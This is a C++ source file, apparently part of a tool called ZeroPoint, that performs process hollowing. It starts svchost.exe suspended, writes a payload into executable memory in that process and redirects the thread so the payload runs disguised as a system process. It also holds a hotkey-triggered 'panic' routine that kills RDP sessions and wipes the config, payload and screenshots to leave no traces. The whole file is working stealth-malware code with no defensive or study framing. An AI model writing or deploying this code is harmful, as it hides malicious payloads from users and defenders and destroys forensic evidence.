// ============================================================================
//  ZeroPoint — Stealth.cpp
//  Process hollowing (RunPE), ghost injection, and panic killswitch.
//
//  Creates a suspended svchost.exe, injects the ZeroPoint payload into its
//  address space via VirtualAllocEx + WriteProcessMemory, then resumes the
//  thread so the payload runs disguised as a legitimate system process.
// ============================================================================

#include "../include/Stealth.h"
#include "../include/VirtualEnv.h"
#include "../include/RDPWrapper.h"
#include <windows.h>
#include <winternl.h>
#include <fstream>
#include <vector>
#include <string>
#include <filesystem>

#pragma comment(lib, "ntdll.lib")

// ============================================================================
//  Payload I/O — read binary file into memory
// ============================================================================

std::vector<BYTE> ReadPayload(const std::string& path) {
    std::ifstream file(path, std::ios::binary | std::ios::ate);
    if (!file.is_open()) return {};

    auto size = file.tellg();
    if (size <= 0 || size > 100 * 1024 * 1024) return {};  // cap at 100 MB

    file.seekg(0, std::ios::beg);
    std::vector<BYTE> buffer(static_cast<size_t>(size));
    if (!file.read(reinterpret_cast<char*>(buffer.data()), size))
        return {};

    return buffer;
}

// ============================================================================
//  Ghost Process Injection — RunPE into a suspended host process
// ============================================================================

bool InjectGhostProcess(const std::string& targetCmd,
                        const std::string& payloadPath) {
    std::vector<BYTE> payload = ReadPayload(payloadPath);
    if (payload.empty()) return false;

    STARTUPINFOA si = {};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {};

    // Create target process in suspended state (no visible window)
    if (!CreateProcessA(nullptr,
                        const_cast<LPSTR>(targetCmd.c_str()),
                        nullptr, nullptr, FALSE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW,
                        nullptr, nullptr, &si, &pi)) {
        return false;
    }

    // Capture the thread context so we can redirect execution
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }

    // Allocate RWX memory inside the target process
    PVOID remoteBase = VirtualAllocEx(pi.hProcess, nullptr, payload.size(),
                                      MEM_COMMIT | MEM_RESERVE,
                                      PAGE_EXECUTE_READWRITE);
    if (!remoteBase) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }

    // Write the payload into the remote allocation
    SIZE_T written = 0;
    if (!WriteProcessMemory(pi.hProcess, remoteBase,
                            payload.data(), payload.size(), &written)) {
        VirtualFreeEx(pi.hProcess, remoteBase, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }

    // Flush instruction cache after writing code
    FlushInstructionCache(pi.hProcess, remoteBase, payload.size());

    // Redirect execution to our payload
#ifdef _WIN64
    ctx.Rcx = (DWORD64)remoteBase;
#else
    ctx.Eax = (DWORD)remoteBase;
#endif
    if (!SetThreadContext(pi.hThread, &ctx)) {
        VirtualFreeEx(pi.hProcess, remoteBase, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }

    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return true;
}

// ============================================================================
//  High-Level Hollowing — inject ZeroPoint payload into svchost.exe
// ============================================================================

bool PerformHollowing() {
    return InjectGhostProcess(
        "C:\\Windows\\System32\\svchost.exe -k LocalService",
        "C:\\ProgramData\\ZeroPoint\\ZeroPointPayload.exe");
}

// ============================================================================
//  Panic Killswitch — terminate + wipe all traces
// ============================================================================
//  Called on Ctrl+Shift+X. Destroys config, wipes the ProgramData folder,
//  stops the VE, kills RDP sessions, and terminates the process immediately.

[[noreturn]] void PanicKillAndWipe() {
    // 1. Stop the Virtual Environment cleanly (disconnect RDP, destroy windows)
    StopVirtualEnvironment();

    // 2. Kill any remaining RDP sessions we own
    KillAllRDPSessions();

    // 3. Delete config and all local traces
    const char* configDir = "C:\\ProgramData\\ZeroPoint";
    try {
        std::filesystem::remove_all(configDir);
    } catch (...) {
        // Best-effort: if filesystem fails, try manual deletion
        DeleteFileA("C:\\ProgramData\\ZeroPoint\\config.ini");
        DeleteFileA("C:\\ProgramData\\ZeroPoint\\ve_config.ini");
        DeleteFileA("C:\\ProgramData\\ZeroPoint\\ve_session.rdp");
        DeleteFileA("C:\\ProgramData\\ZeroPoint\\ZeroPointPayload.exe");
        RemoveDirectoryA("C:\\ProgramData\\ZeroPoint\\screenshots");
        RemoveDirectoryA(configDir);
    }

    // 4. Terminate immediately (no cleanup, no traces)
    TerminateProcess(GetCurrentProcess(), 0);

    // Unreachable, but satisfies [[noreturn]]
    for (;;) ExitProcess(0);
}
